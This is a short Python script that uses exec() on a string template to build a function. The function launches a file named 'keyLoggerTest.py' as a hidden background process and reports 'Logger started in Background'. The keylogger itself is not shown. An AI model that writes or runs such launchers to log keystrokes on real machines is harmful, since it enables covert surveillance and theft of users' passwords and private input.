import subprocess
import sys


def generateScript():
    template = """
def executeCommand():
    import subprocess
    import sys

    process = subprocess.Popen(
        [sys.executable, "keyLoggerTest.py"], 
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True)
    return "Logger started in Background"
"""
    namespace = {}
    exec(template, namespace)
    return namespace['executeCommand']



func = generateScript()
print(func())


